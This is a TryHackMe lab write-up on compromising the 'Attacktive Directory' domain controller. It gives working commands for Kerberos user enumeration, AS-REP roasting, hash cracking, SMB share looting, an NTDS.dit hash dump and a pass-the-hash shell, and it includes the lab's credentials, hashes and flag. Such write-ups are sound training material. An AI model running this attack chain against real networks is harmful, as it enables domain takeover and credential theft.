### 📄 THM: [Machine Name: Attacktive Directory]

**Challenge Details**

- **Category:** [[CyberSecurity]], [[Active Directory]], [[Privilege Escalation]]
    
- **Difficulty:** Easy
    
- **Target:** Attacktive Directory
    
- **Status:** #solved
    
- **Date Completed:** [[2025-09-01]]
    

---

### 🎯 Objective

This write-up documents the methodology used to compromise the `Attacktive Directory` machine. The process involved enumerating valid users from a misconfigured Kerberos service, cracking an AS-REP roasting attack to gain initial access, and then leveraging an exposed backup share to escalate privileges to `Administrator` and capture the root flag.

---

### 🕵️ Reconnaissance & Initial Access

The initial phase involved a full port and service scan using Nmap to identify open services on the target.

Bash

```
nmap -A $target
```

Results:

The scan revealed numerous open ports, characteristic of a Windows Active Directory domain controller. Key services included DNS (53), HTTP (80), Kerberos (88), LDAP (389), and SMB (445). The RDP information revealed the hostname ATTACKTIVEDIREC and the domain name spookysec.local.

#### User Enumeration via Kerberos

I used Kerberos to enumerate valid usernames. The `krb5-enum-users` Nmap script confirmed that this service could be abused for user enumeration, as it returned the `administrator` user.

Bash

```
nmap -T2 -p 88 --script="krb5-enum-users" --script-args="krb5-enum-users.realm='spookysec.local'" $target
```

A more thorough enumeration was performed using `kerbrute`, which confirmed several more users, including `svc-admin`, `backup`, and `robin`, among others.

Bash

```
kerbrute userenum --dc $target -d spookysec.local users.txt
```

**Discovered users:** `james`, `svc-admin`, `robin`, `darkstar`, `administrator`, `backup`, `paradox`.

#### AS-REP Roasting Attack

An **AS-REP Roasting** attack was attempted. This attack targets users who do not require Kerberos pre-authentication (`UF_DONT_REQUIRE_PREAUTH` flag is set), allowing an attacker to request an authentication service ticket for the user without needing to know their password.

I used `impacket-GetNPUsers` to request a ticket for the enumerated users. The `backup` user did not have the `UF_DONT_REQUIRE_PREAUTH` flag, but the `svc-admin` user did.

```bash
impacket-GetNPUsers spookysec.local/ -dc-ip $target -usersfile quick.txt -outputfile hashes.txt 

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

  

[-] [Errno Connection error (10.201.79.233:88)] [Errno 110] Connection timed out

[-] User backup@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
```
Bash

```
impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip $target -outputfile hashes.txt
```

This command successfully retrieved the AS-REP hash for `svc-admin` and saved it to a file. I then used **Hashcat** with a wordlist to crack the hash.

Bash

```
hashcat hash.txt passwd.txt
```

Results:

The hash was successfully cracked, and the password for svc-admin was found: management2005.

**Gained Credentials:**

- **Username:** `svc-admin`
    
- **Password:** `management2005`
    

### 🔑 Privilege Escalation

With the credentials for `svc-admin`, I performed additional reconnaissance to find a way to escalate privileges.

#### SMB Share Enumeration and Access

I used `netexec` to enumerate the available SMB shares for the `svc-admin` user.

Bash

```
netexec smb $target -u svc-admin -p management2005 --shares
```

The scan revealed several shares, including `ADMIN$`, `C$`, and `backup`. The `backup` share had `READ` permissions.

I connected to the `backup` share using `smbclient` to see its contents.

Bash

```
smbclient -t 3600 \\\\$target\\backup -U svc-admin
smb: \> ls
```

The share contained a file named `backup_credentials.txt`. I downloaded the file and examined its contents.

Bash

```
smb: \> get backup_credentials.txt
```

#### Decoding the Credentials

The contents of `backup_credentials.txt` were a Base64-encoded string.

Bash

```
cat backup_credentials.txt
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Decoding the string revealed a new set of credentials for the `backup` user.

Bash

```
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
backup@spookysec.local:backup2517860
```

**New Gained Credentials:**

- **Username:** `backup`
    
- **Password:** `backup2517860`
    

#### NTDS.dit Hash Dump

The new `backup` user credentials were used to dump the NTLM hashes from the domain controller's `NTDS.dit` file using `impacket-secretsdump`. The `just-dc` option was used to target the domain controller directly.

Bash

```
impacket-secretsdump spookysec.local/backup:'backup2517860'@$target -just-dc
```

The output contained the NTLM hashes for all domain accounts, including the `Administrator` account.

**Administrator Hash:** `aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc`

#### Final Root Shell

Using the retrieved NTLM hash for the `Administrator` account, I performed a **Pass-the-Hash** attack to gain a shell on the domain controller with `NT AUTHORITY\SYSTEM` privileges.

Bash

```
impacket-wmiexec administrator@$target -hashes :0e0363213e37b94221497260b0bcb4fc
```

**Shell Output:**

```
C:\>whoami
nt authority\system
```

With `SYSTEM` privileges, I navigated to the `Administrator` user's Desktop to retrieve the `root.txt` file and capture the flag.

```
C:\Users\administrator\Desktop> type root.txt
```

## 🏆 Root Flag

```
TryHackMe{4ctiveD1rectoryM4st3r}
```
